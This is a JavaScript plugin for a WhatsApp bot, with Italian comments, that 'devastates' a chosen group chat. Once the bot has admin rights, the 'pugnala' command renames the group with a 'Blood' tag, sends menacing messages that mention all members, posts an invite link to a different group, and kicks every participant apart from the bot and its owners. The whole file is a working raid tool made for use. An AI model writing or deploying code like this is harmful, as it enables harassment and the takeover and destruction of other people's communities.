let handler = async (m, { conn, text, command }) => {
    const ownerJids = global.owner.map(o => o[0] + '@s.whatsapp.net');
    if (!ownerJids.includes(m.sender)) return;

    // Recupera la lista dei gruppi
    let getGroups = await conn.groupFetchAllParticipating();
    let groups = Object.values(getGroups);

    let targetChat;

    if (!m.isGroup) {
        if (!text) {
            let txt = "🩸 *Scegli il gruppo da devastare:*\n\n";
            groups.forEach((g, i) => {
                txt += `*${i + 1}.* ${g.subject}\n`;
            });
            txt += `\n👉 Scrivi *.${command} [numero]*`;
            return m.reply(txt);
        }

        let index = parseInt(text) - 1;
        if (isNaN(index) || !groups[index]) return m.reply("❌ Numero non valido.");
        targetChat = groups[index].id;
    } else {
        targetChat = m.chat;
    }

    try {
        // --- FORZA REFRESH METADATI ---
        // Il secondo parametro 'true' forza il fetch dai server WA
        let metadata = await conn.groupMetadata(targetChat, true).catch(_ => conn.groupMetadata(targetChat));
        
        // Pulizia ID bot per il confronto (rimuove eventuali :sessionid)
        const botId = conn.user.id.includes(':') ? conn.user.id.split(':')[0] + '@s.whatsapp.net' : conn.user.id;
        
        const participants = metadata.participants || [];
        const botInGroup = participants.find(p => p.id === botId);
        
        // Debug per te (puoi vederlo nei log se non funziona)
        console.log(`Verifica Admin in ${metadata.subject}:`, botInGroup);

        const isActuallyAdmin = botInGroup?.admin === 'admin' || botInGroup?.admin === 'superadmin';

        if (!isActuallyAdmin) {
            return m.reply(`❌ Errore: Il bot NON risulta admin in "${metadata.subject}". \n\nAssicurati che il bot sia admin e riprova tra 10 secondi.`);
        }

        // --- INIZIO DEVASTAZIONE ---
        if (!m.isGroup) await m.reply(`⚔️ Eseguo pugnalata su: *${metadata.subject}*...`);

        // 1. Cambio Nome
        await conn.groupUpdateSubject(targetChat, `${metadata.subject} | 𝚂𝚅𝚃 𝙱𝚢 𝐁𝐋𝐎𝐎𝐃`);

        // 2. Messaggi di avviso
        await conn.sendMessage(targetChat, {
            text: "𝐁𝐥𝐨𝐨𝐝 𝐞̀ 𝐚𝐫𝐫𝐢𝐯𝐚𝐭𝐨 𝐢𝐧 𝐜𝐢𝐫𝐜𝐨𝐥𝐚𝐳𝐢𝐨𝐧𝐞, 𝐞 𝐪𝐮𝐞𝐬𝐭𝐨 𝐬𝐢𝐠𝐧𝐢𝐟𝐢𝐜𝐚 𝐬𝐨𝐥𝐨 𝐮𝐧𝐚 𝐜𝐨𝐬𝐚, 𝐃𝐄𝐕𝐀𝐒𝐓𝐎. 𝐈𝐥 𝐝𝐞𝐯𝐚𝐬𝐭𝐨 𝐜𝐡𝐞 𝐚𝐦𝐦𝐚𝐳𝐳𝐞𝐫𝐚̀ 𝐭𝐮𝐭𝐭𝐢 𝐩𝐫𝐨𝐩𝐫𝐢𝐨 𝐜𝐨𝐦 e 𝐮𝐧𝐚 𝐩𝐮𝐠𝐧𝐚𝐥𝐚𝐭𝐚, 𝐩𝐫𝐨𝐩𝐫𝐢𝐨 𝐪𝐮𝐞𝐥𝐥𝐚 𝐜𝐡𝐞 𝐯𝐢 𝐝𝐚𝐫𝐚̀."
        });

        await conn.sendMessage(targetChat, {
            text: "𝐀𝐯𝐞𝐭𝐞 𝐚𝐯𝐮𝐭𝐨 𝐥' 𝐨𝐧𝐨𝐫𝐞 𝐝𝐢 𝐞𝐬𝐬𝐞𝐫𝐞 𝐬𝐭𝐚𝐭𝐢 𝐩𝐮𝐠𝐧𝐚𝐥𝐚𝐭𝐢 𝐝𝐚 𝐁𝐥𝐨𝐨𝐝, 𝐯𝐢 𝐚𝐬𝐩𝐞𝐭𝐭𝐢𝐚𝐦𝐨 𝐭𝐮𝐭𝐭𝐢 𝐪𝐮𝐚:\n\nhttps://chat.whatsapp.com/HsPqgzLHm25LBVcEd7Ldri",
            mentions: participants.map(p => p.id)
        });

        // 3. Rimozione (kick)
        let usersToRemove = participants
            .map(p => p.id)
            .filter(jid => jid !== botId && !ownerJids.includes(jid));

        if (usersToRemove.length > 0) {
            // Se i partecipanti sono molti, li rimuoviamo a scaglioni
            await conn.groupParticipantsUpdate(targetChat, usersToRemove, 'remove');
        }

        if (!m.isGroup) m.reply(`✅ *${metadata.subject}* è stato pulito.`);

    } catch (e) {
        console.error(e);
        m.reply("❌ Errore fatale: " + e.message);
    }
};

handler.command = ['pugnala'];
handler.owner = true;

export default handler;
